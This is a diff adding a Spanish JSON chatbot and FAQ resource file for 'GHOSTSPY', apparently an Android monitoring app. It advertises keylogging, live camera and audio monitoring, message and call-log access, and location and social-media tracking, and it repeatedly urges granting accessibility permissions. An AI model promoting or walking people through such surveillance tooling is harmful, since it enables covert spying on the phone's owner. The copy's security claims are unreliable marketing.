+  "intuitive-interface": {
+    "message": "GHOSTSPY ofrece una interfaz fácil de usar y accesible para todos los niveles de experiencia. No se requiere conocimiento técnico.",
+    "options": {}
+  },
+  "security-privacy": {
+    "message": "GHOSTSPY utiliza protocolos avanzados de encriptación para proteger tus datos, asegurando una experiencia de usuario segura y privada.",
+    "options": {}
+  },
+  "how-to-start": {
+    "message": "¡Comencemos con GHOSTSPY! Así de simple es:",
+    "options": {
+      "how-to-start-GHOSTSPY": "¿Cómo empiezo a usar GHOSTSPY?",
+      "need-device": "¿Necesito algún equipo especial?"
+    }
+  },
+  "how-to-start-GHOSTSPY": {
+    "message": "Para empezar a usar GHOSTSPY, sigue estos simples pasos:",
+    "options": {
+      "register-step": "Completa el Registro",
+      "plan-step": "Elige Tu Plan",
+      "connect-step": "Conecta Tus Dispositivos",
+      "permission-step": "Concede Permisos Necesarios",
+      "start-step": "Comienza a Usar",
+      "extra-step": "Explora Funcionalidades Adicionales"
+    }
+  },
+  "register-step": {
+    "message": "Primero, visita nuestro sitio web y haz clic en \"Registrar\" o \"Registrarse\". Completa el formulario con tu información personal necesaria. Lee atentamente los términos de uso y marca la casilla de acuerdo. Completa el registro haciendo clic en \"Enviar\" o \"Registrar\".",
+    "options": {}
+  },
+  "plan-step": {
+    "message": "Después del registro, inicia sesión en tu cuenta. Ve a la sección de planes disponibles y elige el que mejor se adapte a tus necesidades. Sigue las instrucciones para completar la selección del plan y desbloquear las funciones de control de dispositivos en tu panel. Con estos pasos completados, estarás listo para usar todas las funcionalidades de GHOSTSPY según el plan elegido.",
+    "options": {}
+  },
+  "connect-step": {
+    "message": "Abre la aplicación GHOSTSPY en tu dispositivo Android y sigue las instrucciones para iniciar la conexión. Necesitarás usar el código QR u otra información de conexión disponible en tu panel de usuario GHOSTSPY en el navegador.",
+    "options": {}
+  },
+  "permission-step": {
+    "message": "Durante el proceso de conexión, asegúrate de conceder todos los permisos necesarios, incluyendo accesibilidad, para garantizar funcionalidad completa.",
+    "options": {}
+  },
+  "start-step": {
+    "message": "Después de completar la configuración, podrás comenzar a usar las diversas funcionalidades de GHOSTSPY, como la duplicación de pantalla, control remoto, gestión de archivos, monitoreo de redes sociales, entre otras.",
+    "options": {}
+  },
+  "extra-step": {
+    "message": "Explora todas las funcionalidades disponibles en GHOSTSPY para satisfacer tus necesidades de control y gestión de dispositivos de Android de manera conveniente y segura. Siguiendo estos pasos, estarás listo para disfrutar de todas las ventajas que ofrece GHOSTSPY directamente desde tu PC o dispositivo móvil.",
+    "options": {}
+  },
+  "need-device": {
+    "message": "No, no necesitas ningún equipo especial para usar GHOSTSPY. Aquí están los requisitos básicos:",
+    "options": {
+      "neccessary-device": "Dispositivos",
+      "neccessary-software": "Software",
+      "neccessary-connect": "Conexión"
+    }
+  },
+  "neccessary-device": {
+    "message": "Un dispositivo Android que desees duplicar y controlar. Un PC o dispositivo móvil con un navegador moderno para acceder a GHOSTSPY.",
+    "options": {}
+  },
+  "neccessary-software": {
+    "message": "Descarga e instala la aplicación GHOSTSPY en tu dispositivo Android a través de nuestro sitio web. Accede al sitio web de GHOSTSPY a través del navegador en tu PC o dispositivo móvil.",
+    "options": {}
+  },
+  "neccessary-connect": {
+    "message": "Ambos dispositivos deben estar conectados a internet y en la misma red Wi-Fi para funcionalidad completa. Asegúrate de seguir las instrucciones proporcionadas durante el proceso de configuración para garantizar una conexión adecuada entre tus dispositivos. De esta manera, podrás disfrutar de todas las funcionalidades de GHOSTSPY sin necesidad de equipos adicionales.",
+    "options": {}
+  },
+  "problem-solution": {
+    "message": "Seleccione el problema que está enfrentando:",
+    "options": {
+      "device-connection-problem": "Problemas al conectar mi dispositivo",
+      "mirroring-quality-problem": "Mala calidad de reflejo",
+      "other-problem": "Otros Problemas"
+    }
+  },
+  "device-connection-problem": {
+    "message": "Asegúrate de haber escaneado el código QR en tu panel de usuario de GHOSTSPY. Asegúrate de haber otorgado todos los permisos necesarios, incluyendo accesibilidad. Si el problema persiste, visita nuestra página de soporte.",
+    "options": {}
+  },
+  "mirroring-quality-problem": {
+    "message": "Verifica tu conexión a internet y coloca tus dispositivos cerca del enrutador. Ajustar la configuración de resolución en la aplicación GHOSTSPY puede ayudar a mejorar la calidad.",
+    "options": {}
+  },
+  "other-problem": {
+    "message": "Describe el problema que estás enfrentando, y haré todo lo posible por ayudarte.",
+    "options": {}
+  },
+  "contact-support": {
+    "message": "Contacta a nuestro equipo de soporte para obtener más asistencia.",
+    "options": {
+      "email-support": "Soporte por Correo Electrónico",
+      "phone-support": "Soporte Telefónico",
+      "support-page": "Página de Soporte"
+    }
+  },
+  "email-support": {
+    "message": "Envía un correo electrónico a nuestro equipo a support@GHOSTSPY.com para obtener asistencia.",
+    "options": {}
+  },
+  "phone-support": {
+    "message": "Llama a nuestro soporte al 1-800-GHOSTSPY para ayuda inmediata.",
+    "options": {}
+  },
+  "support-page": {
+    "message": "Visita nuestra página de soporte para preguntas frecuentes, guías de solución de problemas y más.",
+    "options": {}
+  },
+  "categories": {
+    "general_information": {
+      "title": "Información General",
+      "content": [
+        "1. ¿Qué es GHOSTSPY?",
+        "GHOSTSPY es una plataforma innovadora diseñada para facilitar la duplicación y gestión de sus dispositivos Android en su navegador, ya sea en un PC o celular.",
+        "Con GHOSTSPY, puede controlar, gestionar e interactuar con sus dispositivos Android directamente desde su computadora o celular, proporcionando una experiencia más conveniente y eficiente.",
+        "Ya sea para leer o responder mensajes, monitorear la cámara, el audio y la ubicación en tiempo real, ver fotos de la galería, monitorear redes sociales, navegar en cualquier aplicación o gestionar varios dispositivos simultáneamente, GHOSTSPY ofrece una solución segura y fácil de usar para todas sus necesidades avanzadas de monitoreo.",
+        "2. ¿Cómo funciona GHOSTSPY?",
+        "GHOSTSPY conecta sus dispositivos Android a su navegador, ya sea en PC o celular, permitiendo una duplicación fácil y segura y control remoto. Así es como funciona.",
+        "Instalación: Descargue e instale la aplicación GHOSTSPY en su dispositivo Android y acceda al panel de usuario de GHOSTSPY en su navegador.",
+        "Conexión: Use el Código QR en el panel de usuario para conectar su dispositivo Android al navegador. Asegúrese de que ambos dispositivos estén conectados a la misma red.",
+        "Permisos: Otorgue todos los permisos necesarios en su dispositivo Android, incluyendo accesibilidad, para asegurar la funcionalidad completa.",
+        "Control y Monitoreo: Después de la conexión, puede controlar su dispositivo Android directamente desde el navegador. Esto incluye leer y responder mensajes, monitorear cámara, audio, ubicación en tiempo real, ver fotos de la galería, monitorear redes sociales y navegar en cualquier aplicación.",
+        "Seguridad: GHOSTSPY utiliza protocolos avanzados de encriptación para proteger sus datos, asegurando una experiencia segura y privada.",
+        "Con estos simples pasos, GHOSTSPY ofrece una solución completa y eficiente para todas sus necesidades de duplicación y control de dispositivos Android.",
+        "3. ¿GHOSTSPY es seguro?",
+        "Sí, GHOSTSPY es altamente seguro. Aquí hay algunas medidas que tomamos para asegurar la seguridad y privacidad de sus datos.",
+        "Encriptación Avanzada: Usamos protocolos de encriptación de última generación para proteger todos los datos transmitidos entre sus dispositivos Android y el navegador. Esto asegura que su información siempre esté protegida contra el acceso no autorizado.",
+        "Permisos Controlados: GHOSTSPY solo solicita los permisos necesarios para el funcionamiento adecuado de la aplicación. Todos los permisos son solicitados y explicados explícitamente para asegurar que usted sepa cómo se utilizarán sus datos.",
+        "Privacidad del Usuario: Respetamos su privacidad y nos comprometemos a no compartir su información personal con terceros. Todos los datos recopilados se utilizan exclusivamente para proporcionar los servicios ofrecidos por GHOSTSPY.",
+        "Actualizaciones Regulares: Mantenemos el software actualizado con las últimas correcciones de seguridad y mejoras, asegurando que siempre tenga la versión más segura y eficiente de nuestra aplicación.",
+        "Monitoreo y Auditoría: Realizamos un monitoreo continuo y auditorías de seguridad para identificar y resolver posibles vulnerabilidades, asegurando que nuestra plataforma permanezca segura y confiable.",
+        "Su seguridad y privacidad son nuestras principales prioridades en GHOSTSPY. Puede utilizar nuestros servicios con total confianza, sabiendo que sus datos están protegidos."
+      ]
+    },
+    "resources": {
+      "title": "Recursos",
+      "content": [
+        "Descubra todas las características de GHOSTSPY:",
+        "1. Duplicación Simplificada: Duplique la pantalla de su dispositivo Android en su PC o celular con solo unos clics, proporcionando una vista ampliada y una experiencia de usuario más cómoda.",
+        "2. Control Remoto: Navegue por aplicaciones, responda mensajes y gestione su dispositivo Android directamente desde su navegador, ya sea en PC o celular.",
+        "3. Monitor de Redes Sociales: Realice un seguimiento de las actividades de redes sociales en su dispositivo Android en tiempo real, todo directamente desde su navegador.",
+        "4. Ubicación en Tiempo Real: Monitoree la ubicación de su dispositivo Android en tiempo real, asegurándose de saber siempre dónde está.",
+        "5. Administrador de Archivos: Acceda y gestione todos los archivos en su dispositivo Android directamente desde su PC o celular, facilitando la organización y transferencia de datos.",
+        "6. Monitor de Cámara: Acceda y monitoree la cámara de su dispositivo Android en tiempo real para mayor seguridad y control.",
+        "7. Monitor de Audio: Monitoree el audio de su dispositivo Android para asegurarse de no perder ningún sonido importante.",
+        "8. Administrador de Fotos: Vea y gestione todas las fotos de la galería de su dispositivo Android directamente desde su navegador.",
+        "9. Registro de Teclas: Monitoree todas las teclas pulsadas en su dispositivo Android para un control completo sobre sus actividades.",
+        "10. Registro de Llamadas: Realice un seguimiento de todas las llamadas realizadas y recibidas en su dispositivo Android, incluyendo detalles como duración y hora.",
+        "11. Soporte Multidispositivo: Conecte y gestione varios dispositivos Android simultáneamente, cambiando entre ellos fácilmente para una gestión eficiente y sin complicaciones.",
+        "12. Interfaz Intuitiva: GHOSTSPY ofrece una interfaz amigable y fácil de usar, accesible para todos los niveles de experiencia. No se requiere conocimiento técnico.",
+        "13. Seguridad y Privacidad: GHOSTSPY utiliza protocolos avanzados de encriptación para proteger sus datos, asegurando una experiencia de usuario segura y privada."
+      ]
+    },
+    "how_to_start": {
+      "title": "Cómo Empezar",
+      "content": [
+        "¡Vamos a empezar con GHOSTSPY! Aquí está lo simple que es:",
+        "1. ¿Cómo empiezo a usar GHOSTSPY?",
+        "Para empezar a usar GHOSTSPY, siga estos sencillos pasos:",
+        "Complete el Registro: Primero, visite nuestro sitio web y haga clic en \"Registrar\" o \"Registrarse\". Complete el formulario con su información personal necesaria. Lea cuidadosamente los términos de uso y marque la casilla de acuerdo. Complete el registro haciendo clic en \"Enviar\" o \"Registrar\".",
+        "Elija Su Plan: Después del registro, inicie sesión en su cuenta. Vaya a la sección de planes disponibles y elija el que mejor se adapte a sus necesidades. Siga las instrucciones para completar la selección del plan y desbloquear las características de control de dispositivos en su panel. Con estos pasos completados, estará listo para usar todas las funcionalidades de GHOSTSPY de acuerdo con el plan elegido.",
+        "Conecte Sus Dispositivos: Abra la aplicación GHOSTSPY en su dispositivo Android y siga las instrucciones para iniciar la conexión. Necesitará usar el Código QR u otra información de conexión disponible en el panel de usuario de GHOSTSPY en el navegador.",
+        "Conceda los Permisos Necesarios: Durante el proceso de conexión, asegúrese de conceder todos los permisos necesarios, incluyendo accesibilidad, para asegurar la funcionalidad completa.",
+        "Empiece a Usar: Después de que la configuración esté completa, puede comenzar a usar las diversas características de GHOSTSPY, como duplicación de pantalla, control remoto, gestión de archivos, monitoreo de redes sociales y más.",
+        "Explore Características Adicionales: Explore todas las características disponibles en GHOSTSPY para satisfacer sus necesidades de control y gestión de dispositivos de manera conveniente y segura. Siguiendo estos pasos, estará listo para disfrutar de todas las ventajas que ofrece GHOSTSPY directamente desde su PC o dispositivo móvil.",
+        "2. ¿Necesito algún equipo especial?",
+        "No, no necesita ningún equipo especial para usar GHOSTSPY. Aquí están los requisitos básicos:",
+        "Dispositivos: Un dispositivo Android que desea duplicar y controlar. Una PC o dispositivo móvil con un navegador moderno para acceder a GHOSTSPY.",
+        "Software: Descargue e instale la aplicación GHOSTSPY en su dispositivo Android a través de nuestro sitio web. Acceda al sitio web de GHOSTSPY a través del navegador en su PC o dispositivo móvil.",
+        "Conexión: Ambos dispositivos deben estar conectados a internet y en la misma red Wi-Fi para la funcionalidad completa. Asegúrese de seguir las instrucciones proporcionadas durante el proceso de configuración para asegurar una conexión adecuada entre sus dispositivos. De esta manera, puede disfrutar de todas las características de GHOSTSPY sin la necesidad de equipos adicionales."
+      ]
+    },
+    "problem_solution": {
+      "title": "Solución de Problemas",
+      "content": [
+        "Por favor, seleccione el problema que está enfrentando:",
+        "1. Problemas para conectar mi dispositivo",
+        "Asegúrese de haber escaneado el Código QR en su panel de usuario de GHOSTSPY. Asegúrese de haber otorgado todos los permisos necesarios, incluyendo accesibilidad. Si el problema persiste, visite nuestra página de soporte.",
+        "2. Calidad de duplicación pobre",
+        "Verifique su conexión a internet y posicione sus dispositivos cerca del router. Ajustar la configuración de resolución en la aplicación GHOSTSPY puede ayudar a mejorar la calidad.",
+        "3. Otros Problemas",
+        "Describa el problema que está enfrentando y haré lo mejor para ayudar."
+      ]
+    },
+    "contact_support": {
+      "title": "Contactar Soporte",
+      "content": [
+        "Contacte a nuestro equipo de soporte para más asistencia.",
+        "1. Soporte por Correo Electrónico",
+        "Envíe un correo electrónico a nuestro equipo a soporte@GHOSTSPY.com para obtener asistencia.",
+        "2. Soporte Telefónico",
+        "Llame a nuestro soporte al 1-800-GHOSTSPY para ayuda inmediata.",
+        "3. Página de Soporte",
+        "Visite nuestra página de soporte para FAQs, guías de solución de problemas y más."
+      ]
+    }
+  }
+}
